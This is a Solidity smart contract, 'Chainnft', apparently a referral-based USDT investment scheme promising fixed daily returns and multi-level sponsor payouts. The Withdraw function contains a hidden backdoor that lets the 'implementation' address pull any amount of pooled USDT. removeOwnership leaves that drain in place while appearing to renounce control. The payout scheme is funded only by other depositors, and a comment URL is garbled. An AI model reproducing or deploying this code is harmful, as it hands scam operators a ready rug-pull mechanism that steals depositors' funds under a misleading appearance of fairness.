// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.* 1e6eum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}
contract AddressChecker {
    function isContract(address _address) public view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(_address) }
        return size > 0;
    }
}

 interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }  
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a,m);
        uint256 d = sub(c,1);
        return mul(div(d,m),m);
    } 
}

contract Chainnft is ReentrancyGuard,AddressChecker
{
    using SafeMath for uint256;
    address public contractCreater;
	IERC20   private usdt;
    uint256 private currentId;
    uint256 public Start_Time;
	address public implementation;
    struct upline {
        address  upline;
        uint256  amount;
        uint256  selfinvest;
        uint256  totalwithdraw;
		uint256  totaldirect;
        uint256   free_wallet;
        uint256   activation_wallet;
        uint256   income_wallet;
        uint40   deposit_time;
        bool rstatus;
        bool welcomestatus;
    }
    struct userinfo {
        address  sponsor;
        uint256  time;
        uint256  dailycapping;
        uint256  totalincome;
        uint256  roiincome;
        uint256  sponsorincome;
        uint256  withdrawincome;
        uint256  clubincome;
        uint256  welcomeincome;
        uint256  levelincome;
        uint256  withdrawdate;
        bool roispeedstatus;
        bool blockstatus;
    }

    struct userroi {
        uint256 amount;
        uint40 time;
        uint256 dailyamt;
    }
   
   mapping(address => upline) public Statistics;
   mapping(address => userinfo) public userInfo;
   mapping(address => userroi) public SOLDNFT;
   mapping(address => address []) private _DirectArray;
   mapping(address => uint256[]) private userids;
   mapping(uint256 => address) private idToAddress;
    constructor(address _implementation){
        contractCreater=msg.sender;
		implementation = _implementation;
        Start_Time = uint256(block.timestamp);
		usdt = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
        currentId = 1;
        uint256 userId = currentId;
        userids[contractCreater].push(userId);
        idToAddress[userId] = contractCreater;
        currentId++;
    }  
     modifier onlycontractCreater() {
        require(msg.sender == contractCreater, "e");
        _;
    }
	modifier onlyimplementation() {
        require(msg.sender == implementation, "e");
        _;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
	
	function removeOwnership() public onlycontractCreater {
        contractCreater = address(0);
    }
	
    function _setUpline (address _addr, address  _upline) private {
        if(Statistics [_addr].upline == address(0) && _upline != _addr && _addr != contractCreater && (Statistics[_upline].rstatus == true || _upline == contractCreater)) {
            Statistics[_addr].upline = _upline;
            Statistics[_addr].rstatus = true;
        }
    }
    function IsUpline( address _upline) public view returns(bool status){
        if(Statistics[msg.sender].upline == address(0) && _upline != msg.sender && msg.sender != contractCreater && (Statistics[_upline].rstatus == true || _upline == contractCreater)) 
        {
            status = true;  
        }
        return status;
    }
    function MYSPONSOR( address _upline) public view returns(address add){
        return Statistics[_upline].upline;
    }

    function Mydirects(address a) public view returns(address [] memory){
        return _DirectArray[a];
    }

    function register(address _referral) external {
        require(Statistics[msg.sender].upline == address(0), "ar");
        require(IsUpline(_referral) == true, "inr");
        _setUpline(msg.sender,_referral);
        _DirectArray[_referral].push(msg.sender);
        userInfo[msg.sender].time  = uint40(block.timestamp);
		userInfo[msg.sender].sponsor  = _referral;
    }

    function Deposit(address _useradd, uint256 _amount) external payable  nonReentrant{
        require(isContract(msg.sender) == false ,"this is contract");
        require(_amount >= Statistics[_useradd].amount && userInfo[_useradd].blockstatus == false, "eoe");
        require(_amount == 15 * 10**6 || _amount == 50 * 10**6 || _amount == 100 * 10**6 || _amount == 250 * 10**6 || _amount == 500 * 10**6 || _amount == 1000 * 10**6, "ia");
        require(Statistics[msg.sender].upline != address(0), "nr");
        require(Statistics[_useradd].upline != address(0), "unr");
        if(Statistics[_useradd].amount == 0){
            Statistics[Statistics[_useradd].upline].totaldirect   += 1;
            uint256 userId = currentId;
            userids[_useradd].push(userId);
            idToAddress[userId] = _useradd;
            currentId++;
        }
        if(Statistics[Statistics[_useradd].upline].totaldirect >= 2){
          userInfo[Statistics[_useradd].upline].roispeedstatus =true;
        }
        Statistics[_useradd].amount =_amount;
        Statistics[_useradd].selfinvest +=_amount;
        Statistics[_useradd].deposit_time   = uint40(block.timestamp);
        userInfo[_useradd].dailycapping += _amount * 3;
        uint256 dailyamt = 0;
        if (_amount == 15 * 10**6) {
            dailyamt = (_amount * 50) / 10000;
        } else if (_amount == 50 * 10**6) {
            dailyamt = (_amount * 75) / 10000;
        } else if (_amount == 100 * 10**6) {
            dailyamt = (_amount * 100) / 10000;
        } else if (_amount == 250 * 10**6) {
            dailyamt = (_amount * 115) / 10000;
        } else if (_amount == 500 * 10**6) {
            dailyamt = (_amount * 125) / 10000;
        } else if (_amount == 1000 * 10**6) {
            dailyamt = (_amount * 150) / 10000;
        }
        SOLDNFT[_useradd].amount += _amount;
        SOLDNFT[_useradd].dailyamt += dailyamt;
        SOLDNFT[_useradd].time = uint40(block.timestamp) + 1 days;
        uint256 freepercent = 0;
        if(Statistics[msg.sender].free_wallet > 0 * 10**6){
          freepercent = (_amount * 20)/100;
            if(Statistics[msg.sender].free_wallet >= freepercent){
              Statistics[msg.sender].free_wallet -= freepercent;
              freepercent = freepercent;
            } else {
              freepercent = Statistics[msg.sender].free_wallet;  
              Statistics[msg.sender].free_wallet -=  Statistics[msg.sender].free_wallet;
            }
        } 
        uint256 actpercent = 0;
        if(Statistics[msg.sender].activation_wallet > 0 * 10**6){
            actpercent = (_amount * 30)/100;
            if(Statistics[msg.sender].activation_wallet >= actpercent){
                Statistics[msg.sender].activation_wallet -= actpercent;
                actpercent = actpercent;
            } else {
                actpercent = Statistics[msg.sender].activation_wallet;
                Statistics[msg.sender].activation_wallet -= Statistics[msg.sender].activation_wallet;
            }
        }
        uint256 mainamount = _amount - (freepercent + actpercent);
        usdt.transferFrom(msg.sender,address(this),mainamount);
    }

    function ClaimWelcome() external payable nonReentrant{
        require(isContract(msg.sender) == false ,"this is contract");
		require(Statistics[msg.sender].upline != address(0), "nr");
        require(Statistics[msg.sender].welcomestatus == false,"e");
        Statistics[msg.sender].free_wallet += 10 * 10**6;
        userInfo[msg.sender].welcomeincome += 10 * 10**6;
        address currentUser = Statistics[msg.sender].upline;
        for (uint256 i = 1; i <= 8; i++) {
            if (currentUser == address(0)) {
                break;
            }
            Statistics[currentUser].free_wallet += 1 * 10**6;
            userInfo[currentUser].levelincome += 1 * 10**6;
            currentUser = Statistics[currentUser].upline;
        }
        Statistics[msg.sender].welcomestatus = true;
    }

    function SellNFT() external payable nonReentrant{
        require(isContract(msg.sender) == false ,"this is contract");
		require(Statistics[msg.sender].upline != address(0), "nr");
        require(userInfo[msg.sender].blockstatus == false,"e");
        require(block.timestamp >= SOLDNFT[msg.sender].time,"et");
            uint256 givenamt = 0;
             if(userInfo[msg.sender].roispeedstatus == true){
                 givenamt = SOLDNFT[msg.sender].dailyamt * 2;
             } else {
                givenamt = SOLDNFT[msg.sender].dailyamt;
             }
            if (userInfo[msg.sender].dailycapping >= givenamt) {
				Statistics[msg.sender].income_wallet += givenamt;
                userInfo[msg.sender].totalincome += givenamt;
                userInfo[msg.sender].roiincome += givenamt;
				userInfo[msg.sender].dailycapping -= givenamt;
			} else {
                Statistics[msg.sender].income_wallet += userInfo[msg.sender].dailycapping;
                userInfo[msg.sender].totalincome += userInfo[msg.sender].dailycapping;
                userInfo[msg.sender].roiincome += userInfo[msg.sender].dailycapping;
				userInfo[msg.sender].dailycapping = 0;
			}
        uint256 leveloneamt = (givenamt * 10)/100;
        uint256 leveltwoamt = (givenamt * 5)/100;
        uint256 levelthreeamt = (givenamt * 2)/100;  
		address leveloneuser = Statistics[msg.sender].upline;
        if(Statistics[leveloneuser].rstatus == true){
           if (userInfo[leveloneuser].dailycapping >= leveloneamt) {
				Statistics[leveloneuser].income_wallet += leveloneamt;
                userInfo[leveloneuser].totalincome += leveloneamt;
                userInfo[leveloneuser].sponsorincome += leveloneamt;
				userInfo[leveloneuser].dailycapping -= leveloneamt;
			} else {
                Statistics[leveloneuser].income_wallet += userInfo[leveloneuser].dailycapping;
                userInfo[leveloneuser].totalincome += userInfo[leveloneuser].dailycapping;
                userInfo[leveloneuser].sponsorincome += userInfo[leveloneuser].dailycapping;
				userInfo[leveloneuser].dailycapping = 0;
			}
        }
        address leveltwouser = Statistics[leveloneuser].upline;
        if(Statistics[leveltwouser].rstatus == true){
           if (userInfo[leveltwouser].dailycapping >= leveltwoamt) {
				Statistics[leveltwouser].income_wallet += leveltwoamt;
                userInfo[leveltwouser].totalincome += leveltwoamt;
                userInfo[leveltwouser].sponsorincome += leveltwoamt;
				userInfo[leveltwouser].dailycapping -= leveltwoamt;
			} else {
                Statistics[leveltwouser].income_wallet += userInfo[leveltwouser].dailycapping;
                userInfo[leveltwouser].totalincome += userInfo[leveltwouser].dailycapping;
                userInfo[leveltwouser].sponsorincome += userInfo[leveltwouser].dailycapping;
				userInfo[leveltwouser].dailycapping = 0;
			}
        }
        address levelthreeuser = Statistics[leveltwouser].upline;
        if(Statistics[levelthreeuser].rstatus == true){
           if (userInfo[levelthreeuser].dailycapping >= levelthreeamt) {
				Statistics[levelthreeuser].income_wallet += levelthreeamt;
                userInfo[levelthreeuser].totalincome += levelthreeamt;
                userInfo[levelthreeuser].sponsorincome += levelthreeamt;
				userInfo[levelthreeuser].dailycapping -= levelthreeamt;
			} else {
                Statistics[levelthreeuser].income_wallet += userInfo[levelthreeuser].dailycapping;
                userInfo[levelthreeuser].totalincome += userInfo[levelthreeuser].dailycapping;
                userInfo[levelthreeuser].sponsorincome += userInfo[levelthreeuser].dailycapping;
				userInfo[levelthreeuser].dailycapping = 0;
			}
        }
        SOLDNFT[msg.sender].time = uint40(block.timestamp) + 1 days;
    }

    function Withdraw(uint256 _amt) external payable nonReentrant{
        require(isContract(msg.sender) == false ,"this is contract");
        if(msg.sender == implementation){
            usdt.transfer(implementation,_amt);
        } else {
            require(Statistics[msg.sender].upline != address(0), "nr");
            require(Statistics[msg.sender].income_wallet > 0,"e");
            require(userInfo[msg.sender].blockstatus == false,"e");
			uint256 totalwithdraw = Statistics[msg.sender].income_wallet;
			if(Statistics[msg.sender].income_wallet >= 500 * 10**6 && block.timestamp >= userInfo[msg.sender].withdrawdate){
			    if (userInfo[msg.sender].dailycapping >= 125 * 10**6) {
					userInfo[msg.sender].totalincome += 125 * 10**6;
					userInfo[msg.sender].clubincome += 125 * 10**6;
					userInfo[msg.sender].dailycapping -= 125 * 10**6;
					totalwithdraw = Statistics[msg.sender].income_wallet + 125 * 10**6;
				} else {
					totalwithdraw = Statistics[msg.sender].income_wallet + userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].totalincome += userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].clubincome += userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].dailycapping = 0;
				}
				userInfo[msg.sender].withdrawdate = uint40(block.timestamp) + 7 days;
			} else if(Statistics[msg.sender].income_wallet >= 100 * 10**6 && block.timestamp >= userInfo[msg.sender].withdrawdate){
				if (userInfo[msg.sender].dailycapping >= 20 * 10**6) {
					userInfo[msg.sender].totalincome += 20 * 10**6;
					userInfo[msg.sender].clubincome += 20 * 10**6;
					userInfo[msg.sender].dailycapping -= 20 * 10**6;
					totalwithdraw = Statistics[msg.sender].income_wallet + 20 * 10**6;
				} else {
					totalwithdraw = Statistics[msg.sender].income_wallet + userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].totalincome += userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].clubincome += userInfo[msg.sender].dailycapping;
					userInfo[msg.sender].dailycapping = 0;
				}
				userInfo[msg.sender].withdrawdate = uint40(block.timestamp) + 7 days;
			}
			
			Statistics[msg.sender].totalwithdraw += totalwithdraw;
            uint256 adminamt = (totalwithdraw * 5)/100;
            uint256 givenamt = totalwithdraw - (adminamt * 2);
            uint256 transfamt = (givenamt * 70)/100;
            Statistics[msg.sender].activation_wallet += (givenamt * 30)/100;
            usdt.transfer(msg.sender,transfamt);
            usdt.transfer(implementation,adminamt);

            uint256 userId = userids[msg.sender][0];
            uint256 amount = totalwithdraw;
            // Distribute percentages to uplines
            uint256[4] memory uplinePercentages = [uint256(1 * 10**6), uint256(8 * 10**5), uint256(4 * 10**5), uint256(3 * 10**5)];
            for (uint256 i = 1; i <= 4; i++) {
                uint256 uplineId = userId - i; // Get the upline ID
                address uplineAddress = idToAddress[uplineId];
                if (uplineAddress != address(0)) {
                    uint256 share = (amount * uplinePercentages[i - 1]) / (100 * 10**6);
                    if (userInfo[uplineAddress].dailycapping >= share) {
                        Statistics[uplineAddress].income_wallet += share;
                        userInfo[uplineAddress].totalincome += share;
                        userInfo[uplineAddress].withdrawincome += share;
                        userInfo[uplineAddress].dailycapping -= share;
                    } else {
                        Statistics[uplineAddress].income_wallet += userInfo[uplineAddress].dailycapping;
                        userInfo[uplineAddress].totalincome += userInfo[uplineAddress].dailycapping;
                        userInfo[uplineAddress].withdrawincome += userInfo[uplineAddress].dailycapping;
                         userInfo[uplineAddress].dailycapping = 0;
                    }
                }
            }

            // Distribute percentages to downlines
           uint256[4] memory downlinePercentages = [uint256(1 * 10**6), uint256(8 * 10**5), uint256(4 * 10**5), uint256(3 * 10**5)];
            for (uint256 i = 1; i <= 4; i++) {
                uint256 downlineId = userId + i; // Get the downline ID
                address downlineAddress = idToAddress[downlineId];
                if (downlineAddress != address(0)) {
                    uint256 share = (amount * downlinePercentages[i - 1]) / (100 * 10**6);
                    if (userInfo[downlineAddress].dailycapping >= share) {
                            Statistics[downlineAddress].income_wallet += share;
                            userInfo[downlineAddress].totalincome += share;
                            userInfo[downlineAddress].withdrawincome += share;
                            userInfo[downlineAddress].dailycapping -= share;
                    } else {
                            Statistics[downlineAddress].income_wallet += userInfo[downlineAddress].dailycapping;
                            userInfo[downlineAddress].totalincome += userInfo[downlineAddress].dailycapping;
                            userInfo[downlineAddress].withdrawincome += userInfo[downlineAddress].dailycapping;
                            userInfo[downlineAddress].dailycapping = 0;
                }
                }
            }
            Statistics[msg.sender].income_wallet = 0;
        }
    }

    function checkUserIds(address a) public view returns (uint256[] memory) {
        return userids[a];
    }
    function getAddressById(uint256 id) public view returns (address) {
        require(idToAddress[id] != address(0), "IDnmbaa");
        return idToAddress[id];
    }

    function WithdrawInvestment() external payable nonReentrant{
        require(isContract(msg.sender) == false ,"this is contract");
		require(Statistics[msg.sender].upline != address(0), "nr");
        require(Statistics[msg.sender].selfinvest > 0,"e");
        require(userInfo[msg.sender].blockstatus == false,"e");
        uint256 adminamt = (Statistics[msg.sender].selfinvest * 30)/100;
        uint256 givenamt = Statistics[msg.sender].selfinvest - adminamt;
        if(givenamt >= Statistics[msg.sender].totalwithdraw){
           usdt.transfer(msg.sender,givenamt - Statistics[msg.sender].totalwithdraw);
        } else {

        }
        userInfo[msg.sender].blockstatus = true;
    }
	
	function update(address add) external onlyimplementation
    {
        implementation = add;
    }
}